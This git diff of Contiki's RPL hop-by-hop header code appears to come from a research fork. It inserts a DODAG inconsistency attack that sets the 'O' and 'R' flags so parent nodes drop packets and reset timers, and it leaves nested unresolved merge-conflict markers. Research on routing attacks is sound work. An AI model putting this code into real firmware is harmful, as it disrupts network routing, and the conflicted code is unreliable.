@@ -166,6 +166,13 @@ rpl_verify_hbh_header(int uip_ext_opt_offset)
     if(UIP_EXT_HDR_OPT_RPL_BUF->flags & RPL_HDR_OPT_RANK_ERR) {
       RPL_STAT(rpl_stats.loop_errors++);
       
+<<<<<<< HEAD
+=======
+      
+// George all receiving legal nodes will reset trickle timer
+ 
+      
+>>>>>>> cc3ed74319455f0dafe1454a68d06ead4b851aad
       PRINTF("RPL: Rank error signalled in RPL option!\n");
       /* Packet must be dropped and dio trickle timer reset, see RFC6550 - 11.2.2.2 */
       rpl_reset_dio_timer(instance);
@@ -512,7 +519,11 @@ update_hbh_header(void)
             which states that if a packet is going down it should in
             general not go back up again. If this happens, a
             RPL_HDR_OPT_FWD_ERR should be flagged. */
+<<<<<<< HEAD
       
+=======
+
+>>>>>>> cc3ed74319455f0dafe1454a68d06ead4b851aad
       if((UIP_EXT_HDR_OPT_RPL_BUF->flags & RPL_HDR_OPT_DOWN)) {
         if(uip_ds6_route_lookup(&UIP_IP_BUF->destipaddr) == NULL) {
           UIP_EXT_HDR_OPT_RPL_BUF->flags |= RPL_HDR_OPT_FWD_ERR;
@@ -528,12 +539,16 @@ update_hbh_header(void)
           return 0;
         }
       } else {
+<<<<<<< HEAD
        
+=======
+>>>>>>> cc3ed74319455f0dafe1454a68d06ead4b851aad
         /* Set the down extension flag correctly as described in Section
               11.2 of RFC6550. If the packet progresses along a DAO route,
               the down flag should be set. */
         if(uip_ds6_route_lookup(&UIP_IP_BUF->destipaddr) == NULL) {
 
+<<<<<<< HEAD
 /* THIS VERSION OF CONTIKI is implementing version attack in rpl-icmp6.c
  * The following attack is therefor off, remains only for reference
  */
@@ -548,11 +563,64 @@ update_hbh_header(void)
 	during the attack, the received packet is dropped and the trickle
 	timer is reset */
 	
+=======
+
+/* George ******* DODAG INCONSISTENCY ATTACK AGAINST PARENT NODE *******/
+/* RFC 6550
+   Down 'O': 1-bit flag indicating whether the packet is expected to
+         progress Up or Down.  A router sets the 'O' flag when the
+         packet is expected to progress Down (using DAO routes), and
+         clears it when forwarding toward the DODAG root (to a node with
+         a lower Rank).  A host or RPL leaf node MUST set the 'O' flag
+         to 0.
+
+   Rank-Error 'R': 1-bit flag indicating whether a Rank error was
+         detected.  A Rank error is detected when there is a mismatch in
+         the relative Ranks and the direction as indicated in the 'O'
+         bit.  A host or RPL leaf node MUST set the 'R' bit to 0.
+
+ 	
+ 	DODAG inconsistency paper "Addressing DODAG Inconsistency 
+	Attacks in RPL Networks" mentions:
+	A malicious node, part of an RPL network, can directly
+	attack its PARENT by sending data packets that have the ‘O’
+	and ‘R’ flags set. 
+	Since packets with the ‘O’ flag are intended for descendant nodes, 
+	the receiving parent detects a DODAG inconsistency. If the ‘R’ flag 
+	is also set, which is the case during the attack, the received packet 
+	is dropped and the trickle timer is reset 
+*/
+
+/* SETTING THE DOWN 'O' FLAG. */
+UIP_EXT_HDR_OPT_RPL_BUF->flags |= RPL_HDR_OPT_DOWN;
+
+/* SETTING THE RANK ERROR 'R' FLAG. */
+UIP_EXT_HDR_OPT_RPL_BUF->flags |= RPL_HDR_OPT_RANK_ERR;
+
+<<<<<<< HEAD
+printf("George: flags 'O' & 'R' set. DODAG incons attack in progress\n");
+=======
+
+/* THIS VERSION OF CONTIKI is implementing version attack in rpl-icmp6.c
+ * The following attack is therefor off, remains only for reference
+ */
+
+
+//UIP_EXT_HDR_OPT_RPL_BUF->flags |= RPL_HDR_OPT_DOWN;
+//RPL_HDR_OPT_DOWN &= ~RPL_HDR_OPT_DOWN;
+//printf("George: ILLEGAL options set. UIP_EXT_HDR_OPT_RPL_BUF:%u,RPL_HDR_OPT_DOWN:%u\n",UIP_EXT_HDR_OPT_RPL_BUF,RPL_HDR_OPT_DOWN);
+>>>>>>> ab7e0b6e1747b5a056d6933e155635e4d2d8e745
+
+/*************** DODAG INCONSISTENCY ATTACK AGAINST PARENT NODE *******/
+
+
+				
+/****************** original text *****************/
+>>>>>>> cc3ed74319455f0dafe1454a68d06ead4b851aad
           /* No route was found, so this packet will go towards the RPL
                 root. If so, we should not set the down flag. */
-          UIP_EXT_HDR_OPT_RPL_BUF->flags &= ~RPL_HDR_OPT_DOWN;
+          //UIP_EXT_HDR_OPT_RPL_BUF->flags &= ~RPL_HDR_OPT_DOWN; original
           PRINTF("RPL: Option going up\n");
-
         } else {
           /* A DAO route was found so we set the down flag. */
           UIP_EXT_HDR_OPT_RPL_BUF->flags |= RPL_HDR_OPT_DOWN;
@@ -561,7 +629,6 @@ update_hbh_header(void)
       }
     }
   }
-
   uip_ext_len = last_uip_ext_len;
   return 1;
 }
